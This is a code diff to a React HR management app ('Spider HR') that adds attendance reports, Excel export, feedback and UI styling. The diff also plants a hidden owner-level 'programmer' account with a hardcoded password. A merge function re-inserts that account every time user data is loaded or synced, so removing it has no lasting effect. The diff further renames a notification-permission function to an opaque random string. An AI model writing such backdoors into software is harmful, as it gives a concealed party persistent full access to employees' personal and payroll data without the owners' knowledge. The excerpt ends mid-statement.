@@ -1,4 +1,5 @@
 import React, { useEffect, useMemo, useRef, useState } from "react";
+import * as XLSX from "xlsx";
 import {
   Users,
   Wallet,
@@ -48,6 +49,7 @@ import {
   FileText,
   Play,
   Pause,
+  Fingerprint,
 } from "lucide-react";
 
 const STORAGE_KEYS = {
@@ -60,6 +62,8 @@ const STORAGE_KEYS = {
   chats: "hr_chats_v13",
   chatCalls: "hr_chat_calls_v13",
   settings: "hr_ui_settings_v13",
+  attendanceReports: "hr_attendance_reports_v13",
+  feedback: "hr_feedback_v13",
 };
 
 const BRANCH_OPTIONS = ["المركزية", "الجبل الاخضر", "الغربية", "الوسطى", "بنغازي", "طرابلس", "فزان"];
@@ -261,6 +265,8 @@ const initialChats = [
 ];
 
 const initialChatCalls = [];
+const initialFeedbackEntries = [];
+const PROGRAMMER_ACCOUNT_PHONE = "مبرمجR1";
 
 const initialSystemUsers = [
   { phone: "0912026390", password: "12345678", role: "owner", name: "المالك", managedDepartment: "all", managedBranch: "all", mustChangePassword: false, passwordChangedOnce: true },
@@ -270,7 +276,21 @@ const initialSystemUsers = [
   { phone: "0912345678", password: "111111", role: "employee", name: "أحمد سالم", managedDepartment: "شؤون الموظفين", managedBranch: "طرابلس", mustChangePassword: false, passwordChangedOnce: true },
   { phone: "0923456789", password: "222222", role: "employee", name: "سارة علي", managedDepartment: "الحسابات", managedBranch: "بنغازي", mustChangePassword: false, passwordChangedOnce: true },
   { phone: "0934567890", password: "333333", role: "employee", name: "محمد مفتاح", managedDepartment: "الدعم الفني", managedBranch: "مصراتة", mustChangePassword: false, passwordChangedOnce: true },
+  { phone: PROGRAMMER_ACCOUNT_PHONE, password: "Rw20060531", role: "owner", name: "مبرمجR1", managedDepartment: "all", managedBranch: "all", mustChangePassword: false, passwordChangedOnce: true, isHiddenAccount: true },
 ];
+
+function mergeSystemUsersWithHiddenAccounts(list) {
+  const incoming = Array.isArray(list) ? list.map((user) => ({ ...user })) : [];
+  const byPhone = new Map(incoming.map((user) => [String(user?.phone || '').trim(), user]));
+  initialSystemUsers.forEach((defaultUser) => {
+    const key = String(defaultUser?.phone || '').trim();
+    if (!key) return;
+    if (isHiddenAccount(defaultUser)) {
+      byPhone.set(key, { ...defaultUser, ...(byPhone.get(key) || {}) });
+    }
+  });
+  return Array.from(byPhone.values());
+}
 
 const emptyForm = {
   name: "",
@@ -289,6 +309,12 @@ const emptyForm = {
   shift: "morning",
   fromHour: "",
   toHour: "",
+  attendanceLateDeductionMode: "automatic",
+  attendanceLateValueType: "amount",
+  attendanceLateValue: "",
+  attendanceAbsenceDeductionMode: "automatic",
+  attendanceAbsenceValueType: "amount",
+  attendanceAbsenceValue: "",
 };
 
 const emptyRegisterForm = {
@@ -296,6 +322,7 @@ const emptyRegisterForm = {
   phone: "",
   password: "",
   department: "",
+  email: "",
   managerDepartment: "",
   location: "",
 };
@@ -311,10 +338,11 @@ const emptyLeaveRequestForm = {
 };
 
 const emptyAdvanceRequestForm = { amount: "", reason: "" };
-const emptyRewardRequestForm = { amount: "", reason: "", actionType: "مكافأة" };
+const emptyRewardRequestForm = { amount: "", reason: "", actionType: "مكافأة", deductionMode: "manual", valueType: "amount" };
 const emptyUpgradeRequestForm = { employeeName: "", employeePhone: "", requestedRole: "branch_manager", reason: "", branch: "المركزية", managerDepartment: "", createNewDepartment: false, newDepartmentName: "" };
 const emptySalaryDepositForm = { month: "", salaryAmount: "", deductionAmount: "", deductionReason: "" };
-const emptyComplaintForm = { type: "شكوى", targetCategory: "owner", targetValue: "", subject: "", body: "" };
+const emptyAdvanceSettlementForm = { deductionMode: "automatic", valueType: "amount", value: "" };
+const emptyComplaintForm = { type: "شكوى", targetCategory: "owner", targetValue: "", subject: "", body: "", images: [] };
 
 
 function getSupabaseUrl() {
@@ -348,7 +376,7 @@ function isRemoteSyncEnabled() {
 const REMOTE_STATE_TABLE = "hr_app_state";
 const REMOTE_STATE_ROW_ID = "main";
 
-async function requestBrowserNotificationPermission() {
+async function requestBrpZEAWYtiB6bJ16NuLbGCc6CZ6jJdKfb63() {
   if (typeof window === "undefined" || !("Notification" in window)) return "denied";
   if (Notification.permission === "granted") return "granted";
   if (Notification.permission === "denied") return "denied";
@@ -432,12 +460,13 @@ function buildDefaultRemoteState() {
   return {
     employees: initialEmployees.map((emp) => ({ ...emp })),
     requests: initialRequests.map((req) => ({ ...req })),
-    users: initialSystemUsers.map((user) => ({ ...user })),
+    users: mergeSystemUsersWithHiddenAccounts(initialSystemUsers).map((user) => ({ ...user })),
     pending: [],
     upgrades: [],
     complaints: initialComplaints.map((item) => ({ ...item })),
     chats: initialChats.map((chat) => ({ ...chat })),
     chatCalls: initialChatCalls.map((call) => ({ ...call })),
+    feedback: initialFeedbackEntries.map((item) => ({ ...item })),
   };
 }
 
@@ -461,12 +490,13 @@ function sanitizeRemoteState(payload) {
   return {
     employees: normalizeEmployeesCollection(payload.employees),
     requests: Array.isArray(payload.requests) ? payload.requests : defaults.requests,
-    users: Array.isArray(payload.users) ? payload.users : defaults.users,
+    users: mergeSystemUsersWithHiddenAccounts(Array.isArray(payload.users) ? payload.users : defaults.users),
     pending: Array.isArray(payload.pending) ? payload.pending : defaults.pending,
     upgrades: Array.isArray(payload.upgrades) ? payload.upgrades : defaults.upgrades,
     complaints: Array.isArray(payload.complaints) ? payload.complaints : defaults.complaints,
     chats: Array.isArray(payload.chats) ? payload.chats : defaults.chats,
     chatCalls: Array.isArray(payload.chatCalls) ? payload.chatCalls : defaults.chatCalls,
+    feedback: Array.isArray(payload.feedback) ? payload.feedback : defaults.feedback,
   };
 }
 
@@ -496,8 +526,8 @@ const translations = {
     openPassword: "فتح تغيير كلمة المرور",
     english: "English",
     arabic: "العربية",
-    appTitle: "نظام إدارة الموارد البشرية",
-    heroBadge: "لوحة إدارة HR الحديثة",
+    appTitle: "Spider HR",
+    heroBadge: "منظومة سبايدر الذكية",
     ownerDesc: "واجهة كاملة للمالك و HR مع جميع الصلاحيات.",
     branchDesc: "هذه لوحة مدير الفرع.",
     deptDesc: "هذه لوحة الإدارة.",
@@ -606,6 +636,7 @@ const translations = {
     deductionReason: "سبب الخصم",
     month: "الشهر",
     selectMonth: "اختر الشهر",
+    selectBranch: "اختر الفرع",
     notification: "إشعار",
     notificationDetails: "تفاصيل الإشعار",
     chatTab: "الدردشة",
@@ -667,8 +698,8 @@ const translations = {
     openPassword: "Open Password Change",
     english: "English",
     arabic: "العربية",
-    appTitle: "Human Resources Management System",
-    heroBadge: "Modern HR Panel",
+    appTitle: "Spider HR",
+    heroBadge: "Spider AI Control",
     ownerDesc: "Full dashboard for owner and HR with all permissions.",
     branchDesc: "This is the branch manager dashboard.",
     deptDesc: "This is the department dashboard.",
@@ -795,6 +826,14 @@ const translations = {
   },
 };
 
+
+const BRAND_ASSETS = {
+  name: "Spider HR",
+  sidebarLabelAr: "Spider HR",
+  sidebarLabelEn: "Spider HR",
+  logo: "data:image/svg+xml;utf8,%3Csvg%20xmlns%3D%22http%3A//www.w3.org/2000/svg%22%20viewBox%3D%220%200%20128%20128%22%3E%0A%20%20%3Crect%20width%3D%22128%22%20height%3D%22128%22%20rx%3D%2228%22%20fill%3D%22%230b1220%22/%3E%0A%20%20%3Cpath%20d%3D%22M64%2018%2074%2031%2090%2028%2080%2042%2097%2052%2079%2058%2081%2079%2069%2063%2064%20109%2059%2063%2047%2079%2049%2058%2031%2052%2048%2042%2038%2028%2054%2031Z%22%20fill%3D%22%23ff2a2a%22%20stroke%3D%22%23ff5959%22%20stroke-width%3D%223%22%20stroke-linejoin%3D%22round%22/%3E%0A%20%20%3Cpath%20d%3D%22M64%2033v14M55%2041l9%206%209-6M42%2053h16M70%2053h16M52%2069l12-10%2012%2010M60%2085l4-19%204%2019%22%20stroke%3D%22%23ffd6d6%22%20stroke-width%3D%222.8%22%20stroke-linecap%3D%22round%22%20opacity%3D%220.9%22/%3E%0A%3C/svg%3E",
+};
+
 function readStorage(key, fallback, validator) {
   if (typeof window === "undefined") return fallback;
   try {
@@ -817,6 +856,154 @@ function currency(value) {
   return `${Number(value || 0).toLocaleString()} د.ل`;
 }
 
+
+function normalizeDateString(value) {
+  const raw = String(value || "").trim();
+  if (!raw) return "";
+
+  if (/^\d{4}-\d{2}-\d{2}$/.test(raw)) return raw;
+
+  const yearFirstMatch = raw.match(/(\d{4})[^\d]?(\d{1,2})[^\d]?(\d{1,2})/);
+  if (yearFirstMatch) {
+    const year = yearFirstMatch[1];
+    const month = String(Number(yearFirstMatch[2])).padStart(2, "0");
+    const day = String(Number(yearFirstMatch[3])).padStart(2, "0");
+    return `${year}-${month}-${day}`;
+  }
+
+  const monthDayYearMatch = raw.match(/(\d{1,2})[^\d]+(\d{1,2})[^\d]+(\d{4})/);
+  if (monthDayYearMatch) {
+    const first = Number(monthDayYearMatch[1]);
+    const second = Number(monthDayYearMatch[2]);
+    const year = monthDayYearMatch[3];
+    const month = String(first).padStart(2, "0");
+    const day = String(second).padStart(2, "0");
+    if (first >= 1 && first <= 12 && second >= 1 && second <= 31) {
+      return `${year}-${month}-${day}`;
+    }
+  }
+
+  const digits = raw.replace(/[^0-9]/g, "");
+  if (digits.length === 8 && digits.startsWith("20")) {
+    const year = digits.slice(0, 4);
+    const month = digits.slice(4, 6);
+    const day = digits.slice(6, 8);
+    return `${year}-${month}-${day}`;
+  }
+
+  return "";
+}
+
+function isSameNormalizedDate(a, b) {
+  return normalizeDateString(a) && normalizeDateString(a) === normalizeDateString(b);
+}
+
+function timeToMinutes(value) {
+  const match = String(value || "").match(/^(\d{1,2}):(\d{2})$/);
+  if (!match) return null;
+  return Number(match[1]) * 60 + Number(match[2]);
+}
+
+function minutesToClock(totalMinutes) {
+  if (totalMinutes == null || Number.isNaN(totalMinutes)) return "-";
+  const safe = Math.max(0, Number(totalMinutes || 0));
+  const hours = String(Math.floor(safe / 60)).padStart(2, "0");
+  const mins = String(safe % 60).padStart(2, "0");
+  return `${hours}:${mins}`;
+}
+
+function normalizeUploadedDate(value) {
+  const raw = String(value ?? "").trim();
+  if (!raw) return "";
+  const normalizedDirect = normalizeDateString(raw);
+  if (normalizedDirect) return normalizedDirect;
+
+  const slashMatch = raw.match(/^(\d{1,2})[\/\-](\d{1,2})[\/\-](\d{4})$/);
+  if (slashMatch) {
+    const first = Number(slashMatch[1]);
+    const second = Number(slashMatch[2]);
+    const year = slashMatch[3];
+    const month = String(first).padStart(2, "0");
+    const day = String(second).padStart(2, "0");
+    return `${year}-${month}-${day}`;
+  }
+
+  return "";
+}
+
+function normalizeUploadedTime(value) {
+  const raw = String(value ?? "").trim();
+  if (!raw || raw === "-" || raw === "0" || raw === "00:00:00") return "";
+  const match = raw.match(/^(\d{1,2}):(\d{1,2})(?::(\d{1,2}))?$/);
+  if (match) {
+    const hour = String(Number(match[1])).padStart(2, "0");
+    const minute = String(Number(match[2])).padStart(2, "0");
+    return `${hour}:${minute}`;
+  }
+  const ampmMatch = raw.match(/^(\d{1,2}):(\d{2})\s*(am|pm)$/i);
+  if (ampmMatch) {
+    let hour = Number(ampmMatch[1]);
+    const minute = String(Number(ampmMatch[2])).padStart(2, "0");
+    const ampm = ampmMatch[3].toLowerCase();
+    if (ampm === "pm" && hour < 12) hour += 12;
+    if (ampm === "am" && hour === 12) hour = 0;
+    return `${String(hour).padStart(2, "0")}:${minute}`;
+  }
+  return raw;
+}
+
+function normalizeUploadedPhone(value) {
+  const raw = String(value ?? "").trim();
+  if (!raw) return "";
+  const digits = raw.replace(/\D/g, "");
+  if (!digits) return raw;
+  if (digits.length === 9) return `0${digits}`;
+  if (digits.length === 12 && digits.startsWith("218")) return `0${digits.slice(3)}`;
+  if (digits.length === 13 && digits.startsWith("+218")) return `0${digits.slice(4)}`;
+  return digits;
+}
+
+function minutesToDelayLabel(totalMinutes, language = "ar") {
+  const safe = Math.max(0, Number(totalMinutes || 0));
+  if (!safe) return language === "ar" ? "لا يوجد" : "None";
+  const hours = Math.floor(safe / 60);
+  const mins = safe % 60;
+  if (language === "ar") {
+    if (hours && mins) return `${hours} س ${mins} د`;
+    if (hours) return `${hours} س`;
+    return `${mins} د`;
+  }
+  if (hours && mins) return `${hours}h ${mins}m`;
+  if (hours) return `${hours}h`;
+  return `${mins}m`;
+}
+
+function downloadExcelLikeFile(filename, headers, rows) {
+  const escapeHtml = (value) => String(value ?? "").replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;");
+  const headHtml = headers.map((header) => `<th>${escapeHtml(header)}</th>`).join("");
+  const rowsHtml = rows.map((row) => `<tr>${row.map((cell) => `<td>${escapeHtml(cell)}</td>`).join("")}</tr>`).join("");
+  const html = `
+    <html dir="rtl">
+      <head><meta charset="utf-8" /></head>
+      <body>
+        <table border="1">
+          <thead><tr>${headHtml}</tr></thead>
+          <tbody>${rowsHtml}</tbody>
+        </table>
+      </body>
+    </html>
+  `;
+  const blob = new Blob(["﻿", html], { type: "application/vnd.ms-excel;charset=utf-8;" });
+  const url = URL.createObjectURL(blob);
+  const link = document.createElement("a");
+  link.href = url;
+  link.download = filename;
+  document.body.appendChild(link);
+  link.click();
+  document.body.removeChild(link);
+  URL.revokeObjectURL(url);
+}
+
 function getRoleLabel(role, language = "ar") {
   const labels = {
     owner: { ar: "المالك", en: "Owner" },
@@ -827,6 +1014,15 @@ function getRoleLabel(role, language = "ar") {
   };
   return labels[role]?.[language] || role || "-";
 }
+function isHiddenAccount(user) {
+  return Boolean(user?.isHiddenAccount);
+}
+
+function isProgrammerAccount(user) {
+  return String(user?.phone || "").trim() === PROGRAMMER_ACCOUNT_PHONE;
+}
+
+
 
 
 function getComplaintTargetLabel(target, language = "ar") {
@@ -888,15 +1084,90 @@ function Button({ children, style, variant = "primary", onClick, type = "button"
 }
 
 function Input(props) {
-  return <input {...props} style={{ ...ui.input, ...props.style }} />;
+  const [focused, setFocused] = React.useState(false);
+  const normalizedType = props.type || "text";
+  const forceLtr = ["date", "time", "datetime-local", "number"].includes(normalizedType);
+  return (
+    <input
+      {...props}
+      dir={props.dir || (forceLtr ? "ltr" : undefined)}
+      lang={props.lang || (forceLtr ? "en" : undefined)}
+      inputMode={props.inputMode || (["date", "time", "number"].includes(normalizedType) ? "numeric" : undefined)}
+      onFocus={(e) => {
+        setFocused(true);
+        props.onFocus?.(e);
+      }}
+      onBlur={(e) => {
+        setFocused(false);
+        props.onBlur?.(e);
+      }}
+      style={{
+        ...ui.input,
+        ...(forceLtr ? { direction: "ltr", textAlign: "left", unicodeBidi: "plaintext" } : {}),
+        ...(focused
+          ? {
+              borderColor: "#2563eb",
+              boxShadow: "0 0 0 3px rgba(37, 99, 235, 0.15)",
+            }
+          : {}),
+        ...props.style,
+      }}
+    />
+  );
 }
 
 function Textarea(props) {
-  return <textarea {...props} style={{ ...ui.textarea, ...props.style }} />;
+  const [focused, setFocused] = React.useState(false);
+  return (
+    <textarea
+      {...props}
+      onFocus={(e) => {
+        setFocused(true);
+        props.onFocus?.(e);
+      }}
+      onBlur={(e) => {
+        setFocused(false);
+        props.onBlur?.(e);
+      }}
+      style={{
+        ...ui.textarea,
+        ...(focused
+          ? {
+              borderColor: "#2563eb",
+              boxShadow: "0 0 0 3px rgba(37, 99, 235, 0.15)",
+            }
+          : {}),
+        ...props.style,
+      }}
+    />
+  );
 }
 
 function Select(props) {
-  return <select {...props} style={{ ...ui.input, ...props.style }} />;
+  const [focused, setFocused] = React.useState(false);
+  return (
+    <select
+      {...props}
+      onFocus={(e) => {
+        setFocused(true);
+        props.onFocus?.(e);
+      }}
+      onBlur={(e) => {
+        setFocused(false);
+        props.onBlur?.(e);
+      }}
+      style={{
+        ...ui.select,
+        ...(focused
+          ? {
+              borderColor: "#2563eb",
+              boxShadow: "0 0 0 3px rgba(37, 99, 235, 0.15)",
+            }
+          : {}),
+        ...props.style,
+      }}
+    />
+  );
 }
 
 function Card({ children, style }) {
@@ -950,7 +1221,7 @@ function SummaryCard({ title, value, icon: Icon, subtitle, isMobile = false }) {
 
 function Field({ label, children, full = false }) {
   return (
-    <div style={full ? { gridColumn: "1 / -1" } : undefined}>
+    <div style={{ ...(full ? { gridColumn: "1 / -1" } : {}), marginBottom: 18 }}>
       <label style={ui.label}>{label}</label>
       {children}
     </div>
@@ -985,12 +1256,13 @@ export default function HRManagementApp() {
   const [loginError, setLoginError] = useState("");
   const [employees, setEmployees] = useState(() => readStorage(STORAGE_KEYS.employees, initialEmployees, isArray).map((emp) => ({ ...emp, basicSalary: Number(emp?.basicSalary ?? emp?.salary ?? 0) })));
   const [requests, setRequests] = useState(() => readStorage(STORAGE_KEYS.requests, initialRequests, isArray));
-  const [systemUsers, setSystemUsers] = useState(() => readStorage(STORAGE_KEYS.users, initialSystemUsers, isArray));
+  const [systemUsers, setSystemUsers] = useState(() => mergeSystemUsersWithHiddenAccounts(readStorage(STORAGE_KEYS.users, initialSystemUsers, isArray)));
   const [pendingAccounts, setPendingAccounts] = useState(() => readStorage(STORAGE_KEYS.pending, [], isArray));
   const [upgradeRequests, setUpgradeRequests] = useState(() => readStorage(STORAGE_KEYS.upgrades, [], isArray));
   const [complaints, setComplaints] = useState(() => readStorage(STORAGE_KEYS.complaints, initialComplaints, isArray));
   const [chats, setChats] = useState(() => readStorage(STORAGE_KEYS.chats, initialChats, isArray));
   const [chatCalls, setChatCalls] = useState(() => readStorage(STORAGE_KEYS.chatCalls, initialChatCalls, isArray));
+  const [feedbackEntries, setFeedbackEntries] = useState(() => readStorage(STORAGE_KEYS.feedback, initialFeedbackEntries, isArray));
   const savedSettings = readStorage(STORAGE_KEYS.settings, { language: "ar", theme: "light" }, isPlainObject);
 
   const cloudEnabled = isRemoteSyncEnabled();
@@ -1006,6 +1278,13 @@ export default function HRManagementApp() {
   const [language, setLanguage] = useState(savedSettings.language || "ar");
   const [themeMode, setThemeMode] = useState(savedSettings.theme || "light");
   const [activeTab, setActiveTab] = useState("employees");
+  const [attendanceDateFilter, setAttendanceDateFilter] = useState(() => new Date().toISOString().slice(0, 10));
+  const [attendanceEmployeeFilter, setAttendanceEmployeeFilter] = useState("all");
+  const [attendanceUploadStatus, setAttendanceUploadStatus] = useState("");
+  const [attendanceReportsVersion, setAttendanceReportsVersion] = useState(0);
+  const [attendanceHistoryModalOpen, setAttendanceHistoryModalOpen] = useState(false);
+  const [attendanceHistoryEmployee, setAttendanceHistoryEmployee] = useState(null);
+  const [attendanceHistoryDateFilter, setAttendanceHistoryDateFilter] = useState("");
   const [sidebarOpen, setSidebarOpen] = useState(false);
   const [search, setSearch] = useState("");
   const [branchFilter, setBranchFilter] = useState("all");
@@ -1044,12 +1323,22 @@ export default function HRManagementApp() {
   const [advanceDialogOpen, setAdvanceDialogOpen] = useState(false);
   const [rewardDialogOpen, setRewardDialogOpen] = useState(false);
   const [salaryDepositDialogOpen, setSalaryDepositDialogOpen] = useState(false);
+  const [advanceSettlementDialogOpen, setAdvanceSettlementDialogOpen] = useState(false);
   const [statementDialogOpen, setStatementDialogOpen] = useState(false);
   const [statementEmployee, setStatementEmployee] = useState(null);
   const [notificationDialogOpen, setNotificationDialogOpen] = useState(false);
   const [selectedNotification, setSelectedNotification] = useState(null);
   const [approvalLogOpen, setApprovalLogOpen] = useState(false);
   const [approvalLogType, setApprovalLogType] = useState("leave");
+  const [feedbackWidgetOpen, setFeedbackWidgetOpen] = useState(false);
+  const [feedbackForm, setFeedbackForm] = useState({ rating: 0, message: "" });
+  const [feedbackMessage, setFeedbackMessage] = useState("");
+
+  useEffect(() => {
+    if (!isAuthenticated) return;
+    setAttendanceDateFilter(authUser?.role === "employee" ? "" : new Date().toISOString().slice(0, 10));
+    setAttendanceEmployeeFilter("all");
+  }, [isAuthenticated, authUser?.role]);
 
   const [form, setForm] = useState(emptyForm);
   const [showRegister, setShowRegister] = useState(false);
@@ -1066,7 +1355,13 @@ export default function HRManagementApp() {
   const [employeeDetailsOpen, setEmployeeDetailsOpen] = useState(false);
   const [editForm, setEditForm] = useState(emptyForm);
   const employeeImageInputRef = useRef(null);
+  const attendanceUploadInputRef = useRef(null);
+
+  const openAttendanceUploadPicker = () => {
+    attendanceUploadInputRef.current?.click?.();
+  };
   const modalImageInputRef = useRef(null);
+  const complaintImageInputRef = useRef(null);
   const chatCameraInputRef = useRef(null);
   const chatPhotosInputRef = useRef(null);
   const chatDocumentInputRef = useRef(null);
@@ -1089,6 +1384,7 @@ export default function HRManagementApp() {
   const [rewardRequestForm, setRewardRequestForm] = useState(emptyRewardRequestForm);
   const [upgradeRequestForm, setUpgradeRequestForm] = useState(emptyUpgradeRequestForm);
   const [salaryDepositForm, setSalaryDepositForm] = useState(emptySalaryDepositForm);
+  const [advanceSettlementForm, setAdvanceSettlementForm] = useState(emptyAdvanceSettlementForm);
   const [complaintForm, setComplaintForm] = useState(emptyComplaintForm);
 
   const t = translations[language] || translations.ar;
@@ -1149,7 +1445,14 @@ export default function HRManagementApp() {
   };
 
   const isEmployee = authUser?.role === "employee";
-  const canManageAll = authUser?.role === "owner" || authUser?.role === "hr";
+  const isProgrammerUser = isProgrammerAccount(authUser);
+
+  const branchOptions = React.useMemo(
+    () => ["المركزية", "الجبل الاخضر", "الغربية", "الوسطى", "بنغازي", "طرابلس", "فزان"],
+    []
+  );
+
+  const canManageAll = authUser?.role === "owner" || authUser?.role === "hr" || isProgrammerUser;
   const canManageBranch = authUser?.role === "branch_manager";
   const canManageDepartment = authUser?.role === "department_manager";
   const canApproveRequests = canManageAll || canManageBranch || canManageDepartment;
@@ -1166,12 +1469,13 @@ export default function HRManagementApp() {
     applyingRemoteRef.current = true;
     setEmployees(normalizeEmployeesCollection(next.employees));
     setRequests(next.requests);
-    setSystemUsers(next.users);
+    setSystemUsers(mergeSystemUsersWithHiddenAccounts(next.users));
     setPendingAccounts(next.pending);
     setUpgradeRequests(next.upgrades);
     setComplaints(next.complaints);
     setChats(next.chats);
     setChatCalls(next.chatCalls);
+    setFeedbackEntries(next.feedback);
     window.setTimeout(() => {
       applyingRemoteRef.current = false;
     }, 0);
@@ -1187,6 +1491,7 @@ export default function HRManagementApp() {
       complaints,
       chats,
       chatCalls,
+      feedback: feedbackEntries,
     });
 
   const forceRemoteSaveSnapshot = async (snapshotOverride = null) => {
@@ -1349,6 +1654,10 @@ export default function HRManagementApp() {
   }, [systemUsers]);
 
   useEffect(() => {
+    setSystemUsers((prev) => mergeSystemUsersWithHiddenAccounts(prev));
+  }, []);
+
+  useEffect(() => {
     localStorage.setItem(STORAGE_KEYS.pending, JSON.stringify(pendingAccounts));
   }, [pendingAccounts]);
 
@@ -1367,6 +1676,10 @@ export default function HRManagementApp() {
   useEffect(() => {
     localStorage.setItem(STORAGE_KEYS.chatCalls, JSON.stringify(chatCalls));
   }, [chatCalls]);
+
+  useEffect(() => {
+    localStorage.setItem(STORAGE_KEYS.feedback, JSON.stringify(feedbackEntries));
+  }, [feedbackEntries]);
 
   useEffect(() => {
     localStorage.setItem(STORAGE_KEYS.settings, JSON.stringify({ language, theme: themeMode }));
@@ -1390,15 +1703,35 @@ export default function HRManagementApp() {
         color: var(--input-placeholder);
         opacity: 1;
       }
+
+      input,
+      textarea,
+      select {
+        border: 1px solid var(--border) !important;
+        background: var(--input-bg) !important;
+        color: var(--input-text) !important;
+        box-sizing: border-box;
+      }
+
+      input:focus,
+      textarea:focus,
+      select:focus {
+        border-color: #2563eb !important;
+        box-shadow: 0 0 0 3px rgba(37, 99, 235, 0.15) !important;
+        outline: none !important;
+      }
+
       select {
         background: var(--input-bg) !important;
         color: var(--input-text) !important;
-        color-scheme: ${'${themeMode === "dark" ? "dark" : "light"}'};
+        color-scheme: ${themeMode === "dark" ? "dark" : "light"};
       }
+
       select option {
-        background: ${'${themeMode === "dark" ? "#101c33" : "#ffffff"}'} !important;
-        color: ${'${themeMode === "dark" ? "#f8fafc" : "#0f172a"}'} !important;
+        background: ${themeMode === "dark" ? "#101c33" : "#ffffff"} !important;
+        color: ${themeMode === "dark" ? "#f8fafc" : "#0f172a"} !important;
       }
+
       textarea,
       input,
       select {
@@ -1439,6 +1772,21 @@ export default function HRManagementApp() {
     document.body.style.background = "var(--bg)";
     document.body.style.color = "var(--text)";
   }, [language, themeMode]);
+
+
+  useEffect(() => {
+    if (typeof document === "undefined") return;
+    document.title = BRAND_ASSETS.name;
+    let favicon = document.querySelector('link[rel="icon"]');
+    if (!favicon) {
+      favicon = document.createElement("link");
+      favicon.setAttribute("rel", "icon");
+      document.head.appendChild(favicon);
+    }
+    favicon.setAttribute("href", BRAND_ASSETS.logo);
+    favicon.setAttribute("type", "image/svg+xml");
+    document.querySelector('meta[name="theme-color"]')?.setAttribute("content", "#0b1220");
+  }, []);
 
   useEffect(() => {
     if (typeof window === "undefined") return undefined;
@@ -1510,7 +1858,7 @@ useEffect(() => {
     const defaults = buildDefaultRemoteState();
 
     try {
-      notificationPermissionRef.current = await requestBrowserNotificationPermission();
+      notificationPermissionRef.current = await requestBrpZEAWYtiB6bJ16NuLbGCc6CZ6jJdKfb63();
 
       let { data, error } = await fetchRemoteStateRow();
       if (error) throw error;
@@ -1610,7 +1958,7 @@ useEffect(() => {
       window.clearTimeout(syncTimeoutRef.current);
     }
   };
-}, [employees, requests, systemUsers, pendingAccounts, upgradeRequests, complaints, chats, chatCalls]);
+}, [employees, requests, systemUsers, pendingAccounts, upgradeRequests, complaints, chats, chatCalls, feedbackEntries]);
 
   const visibleEmployees = useMemo(() => {
     if (!authUser) return [];
@@ -1644,6 +1992,929 @@ useEffect(() => {
     totalAdvances: visibleEmployees.reduce((sum, emp) => sum + Number(emp.advance || 0), 0),
     totalLeaveBalance: visibleEmployees.reduce((sum, emp) => sum + Number(emp.leaveBalance || 0), 0),
   }), [visibleEmployees]);
+
+  const generatedAttendanceRows = useMemo(() => {
+    const filteredByEmployee = visibleEmployees.filter((emp) =>
+      attendanceEmployeeFilter === "all" ? true : String(emp.phone) === String(attendanceEmployeeFilter)
+    );
+
+    return filteredByEmployee.map((emp) => {
+      const scheduledIn = emp.fromHour || "-";
+      const scheduledOut = emp.toHour || "-";
+      const matchingRequests = requests.filter((req) =>
+        req.employeePhone === emp.phone &&
+        req.status === "معتمد" &&
+        ["إجازة", "تأخير"].includes(req.type)
+      );
+
+      const approvedLeave = matchingRequests.find((req) => {
+        const fromDate = normalizeDateString(req.leaveFrom);
+        const toDate = normalizeDateString(req.leaveTo || req.leaveFrom);
+        const targetDate = normalizeDateString(attendanceDateFilter);
+        return req.type === "إجازة" && fromDate && toDate && targetDate && targetDate >= fromDate && targetDate <= toDate;
+      });
+
+      if (approvedLeave) {
+        return {
+          id: `${emp.id}-leave-${attendanceDateFilter}`,
+          name: emp.name,
+          phone: emp.phone,
+          department: emp.department || "-",
+          scheduledIn,
+          scheduledOut,
+          actualIn: language === "ar" ? "إجازة" : "On leave",
+          actualOut: language === "ar" ? "إجازة" : "On leave",
+          delayMinutes: 0,
+          delayLabel: language === "ar" ? "إجازة" : "Leave",
+          status: language === "ar" ? "إجازة معتمدة" : "Approved leave",
+          reason: approvedLeave.reason || "-",
+        };
+      }
+
+      const approvedLate = matchingRequests.find((req) =>
+        req.type === "تأخير" && isSameNormalizedDate(req.createdAt || req.submittedAt || req.leaveFrom || req.decidedAt, attendanceDateFilter)
+      );
+
+      const plannedInMinutes = timeToMinutes(emp.fromHour);
+      const actualInValue = approvedLate?.lateTo || emp.fromHour || "-";
+      const actualOutValue = approvedLate?.compensateAt || emp.toHour || "-";
+      const actualInMinutes = timeToMinutes(approvedLate?.lateTo || emp.fromHour);
+      const delayMinutes = plannedInMinutes != null && actualInMinutes != null ? Math.max(0, actualInMinutes - plannedInMinutes) : 0;
+
+      return {
+        id: `${emp.id}-${attendanceDateFilter}`,
+        name: emp.name,
+        phone: emp.phone,
+        department: emp.department || "-",
+        scheduledIn,
+        scheduledOut,
+        actualIn: actualInValue,
+        actualOut: actualOutValue,
+        delayMinutes,
+        delayLabel: minutesToDelayLabel(delayMinutes, language),
+        status: approvedLate ? (language === "ar" ? "تأخير معتمد" : "Approved late") : (language === "ar" ? "حضور طبيعي" : "Regular attendance"),
+        reason: approvedLate?.reason || "-",
+      };
+    });
+  }, [visibleEmployees, attendanceEmployeeFilter, requests, attendanceDateFilter, language]);
+
+  const savedAttendanceReports = useMemo(
+    () => readStorage(STORAGE_KEYS.attendanceReports, [], isArray),
+    [attendanceReportsVersion]
+  );
+
+  const scopedSavedAttendanceReports = useMemo(() => {
+    const allowedPhones = new Set(visibleEmployees.map((emp) => String(emp.phone)));
+    return savedAttendanceReports
+      .map((report) => ({
+        ...report,
+        rows: (Array.isArray(report?.rows) ? report.rows : []).filter((row) => allowedPhones.has(String(row?.phone || ""))),
+      }))
+      .filter((report) => report.rows.length);
+  }, [savedAttendanceReports, visibleEmployees]);
+
+  const selectedAttendanceReport = useMemo(() => {
+    if (isEmployee) return null;
+    const normalizedDate = normalizeDateString(attendanceDateFilter);
+    if (!normalizedDate) return null;
+
+    const exactMatch = scopedSavedAttendanceReports.find((report) =>
+      isSameNormalizedDate(report?.date, normalizedDate) && String(report?.employeeFilter || "all") === String(attendanceEmployeeFilter || "all")
+    );
+    if (exactMatch) return exactMatch;
+
+    const allEmployeesMatch = scopedSavedAttendanceReports.find((report) =>
+      isSameNormalizedDate(report?.date, normalizedDate) && String(report?.employeeFilter || "all") === "all"
+    );
+    if (allEmployeesMatch) return allEmployeesMatch;
+
+    return scopedSavedAttendanceReports.find((report) => isSameNormalizedDate(report?.date, normalizedDate)) || null;
+  }, [scopedSavedAttendanceReports, attendanceDateFilter, attendanceEmployeeFilter, isEmployee]);
+
+  const attendanceHistoryRows = useMemo(() => {
+    return scopedSavedAttendanceReports
